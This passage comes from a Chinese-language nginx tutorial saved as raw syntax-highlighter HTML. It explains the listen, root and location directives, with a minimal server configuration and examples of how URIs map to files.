v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37c4d32d5213248295\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nlisten unix:/var/run/nginx.sock;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32d5213248295-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32d5213248295-1\"><span class=\"crayon-i\">listen</span> <span class=\"crayon-v\">unix</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">run</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sock</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>你甚至可以使用主机名</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37c4d32d8553726366\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nlisten localhost:80;\r\nlisten netguru.co:80;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32d8553726366-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32d8553726366-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32d8553726366-1\"><span class=\"crayon-i\">listen</span> <span class=\"crayon-v\">localhost</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">80</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32d8553726366-2\"><span class=\"crayon-i\">listen</span> <span class=\"crayon-v\">netguru</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">co</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">80</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>但请慎用，由于主机可能无法启动 nginx，导致无法绑定在特定的 TCP Socket。</p>\n<p>最后，如果指令不存在，则使用 <code>*:80</code>。</p>\n<h2>最小化配置</h2>\n<p>有了这些知识 – 我们应该能够创建并理解运行 nginx 所需的最低配置。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37c4d32db628758136\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# /etc/nginx/nginx.conf\r\n\r\nevents {}                   # events context needs to be defined to consider config valid\r\n\r\nhttp {\r\n server {\r\n    listen 80;\r\n    server_name  netguru.co  www.netguru.co  *.netguru.co;\r\n\r\n    return 200 \"Hello\";\r\n  }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32db628758136-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32db628758136-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32db628758136-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32db628758136-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32db628758136-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32db628758136-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32db628758136-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32db628758136-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32db628758136-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32db628758136-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32db628758136-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32db628758136-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32db628758136-1\"><span class=\"crayon-p\"># /etc/nginx/nginx.conf</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32db628758136-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32db628758136-3\"><span class=\"crayon-e\">events</span> <span class=\"crayon-sy\">{</span><span class=\"crayon-sy\">}</span>                   <span class=\"crayon-p\"># events context needs to be defined to consider config valid</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32db628758136-4\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32db628758136-5\"><span class=\"crayon-e\">http</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32db628758136-6\"> <span class=\"crayon-e\">server</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32db628758136-7\">    <span class=\"crayon-i\">listen</span> <span class=\"crayon-cn\">80</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32db628758136-8\">    <span class=\"crayon-v\">server</span><span class=\"crayon-sy\">_</span>name  <span class=\"crayon-v\">netguru</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">co</span>  <span class=\"crayon-v\">www</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">netguru</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">co</span>  <span class=\"crayon-o\">*</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">netguru</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">co</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32db628758136-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32db628758136-10\">    <span class=\"crayon-st\">return</span> <span class=\"crayon-cn\">200</span> <span class=\"crayon-s\">\"Hello\"</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32db628758136-11\">  <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32db628758136-12\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p></p>\n<h2>root, location, 和 try_files 指令</h2>\n<h3>root 指令</h3>\n<p>root 指令设置请求的根目录，允许 nginx 将传入请求映射到文件系统。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37c4d32de297803882\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nserver {\r\n  listen 80;\r\n  server_name netguru.co;\r\n  root /var/www/netguru.co;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32de297803882-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32de297803882-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32de297803882-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32de297803882-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32de297803882-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32de297803882-1\"><span class=\"crayon-e\">server</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32de297803882-2\">  <span class=\"crayon-i\">listen</span> <span class=\"crayon-cn\">80</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32de297803882-3\">  <span class=\"crayon-v\">server</span><span class=\"crayon-sy\">_</span>name <span class=\"crayon-v\">netguru</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">co</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32de297803882-4\">  <span class=\"crayon-i\">root</span> <span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">www</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">netguru</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">co</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32de297803882-5\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>根据给定的请求，指定 nginx 服务器允许的内容</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37c4d32e3981673970\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nnetguru.co:80/index.html     # returns /var/www/netguru.co/index.html\r\nnetguru.co:80/foo/index.html # returns /var/www/netguru.co/foo/index.html</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32e3981673970-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32e3981673970-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32e3981673970-1\"><span class=\"crayon-v\">netguru</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">co</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">80</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">html</span>     <span class=\"crayon-p\"># returns /var/www/netguru.co/index.html</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32e3981673970-2\"><span class=\"crayon-v\">netguru</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">co</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">80</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">foo</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">html</span> <span class=\"crayon-p\"># returns /var/www/netguru.co/foo/index.html</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p></p>\n<h3><code>location</code> 指令</h3>\n<p>location指令根据请求的 URI 来设置配置。</p>\n<p><code>location [modifier] path</code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37c4d32e7982135051\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nlocation /foo/ {\r\n  # ...\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32e7982135051-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32e7982135051-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32e7982135051-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32e7982135051-1\"><span class=\"crayon-e\">location</span> <span class=\"crayon-o\">/</span><span class=\"crayon-e\">foo</span><span class=\"crayon-o\">/</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32e7982135051-2\">  <span class=\"crayon-p\"># ...</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32e7982135051-3\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>如果没有指定修饰符，则路径被视为前缀，其后可以跟随任何东西。</p>\n<p>以上例子将匹配</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37c4d32ea760218987\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n/foo\r\n/fooo\r\n/foo123\r\n/foo/bar/index.html\r\n...</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32ea760218987-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32ea760218987-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32ea760218987-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32ea760218987-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32ea760218987-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32ea760218987-1\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">foo</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32ea760218987-2\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">fooo</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32ea760218987-3\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">foo123</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32ea760218987-4\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">foo</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bar</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">html</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32ea760218987-5\"><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>此外，在给定的上下文中可以使用多个 location 指令。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37c4d32ee580056794\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" 